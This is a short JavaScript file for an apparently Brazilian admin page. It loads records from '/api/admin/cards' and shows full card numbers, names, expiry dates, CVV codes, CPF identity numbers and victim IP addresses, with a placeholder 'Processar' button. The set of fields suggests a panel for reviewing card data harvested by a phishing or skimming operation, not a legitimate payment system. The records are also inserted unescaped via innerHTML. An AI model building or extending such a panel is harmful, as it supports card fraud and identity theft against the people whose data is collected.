document.addEventListener('DOMContentLoaded', async () => {
    const tableBody = document.getElementById('cards-table-body');
    const loadingState = document.getElementById('loading-state');
    const emptyState = document.getElementById('empty-state');

    try {
        const response = await fetch('/api/admin/cards');
        const data = await response.json();

        if (response.ok && data.cards && data.cards.length > 0) {
            loadingState.style.display = 'none';
            emptyState.style.display = 'none';
            
            data.cards.forEach(card => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>
                        <div style="font-weight: 600;">${card.card_number}</div>
                        <div style="font-size: 11px; color: var(--text-secondary);">${card.card_name}</div>
                    </td>
                    <td>${card.expiry}</td>
                    <td>${card.cvv}</td>
                    <td>${card.cpf}</td>
                    <td>
                        <div style="font-size: 12px;">${card.ip}</div>
                        <div style="font-size: 11px; color: var(--text-secondary);">${new Date(card.created_at).toLocaleString('pt-BR')}</div>
                    </td>
                    <td>
                        <button class="btn-action" onclick="alert('Funcionalidade de processamento em breve')">Processar</button>
                    </td>
                `;
                tableBody.appendChild(row);
            });
        } else {
            loadingState.style.display = 'none';
            emptyState.style.display = 'flex';
        }
    } catch (err) {
        console.error('Erro ao carregar cartões:', err);
        loadingState.textContent = 'Erro ao carregar dados.';
    }
});
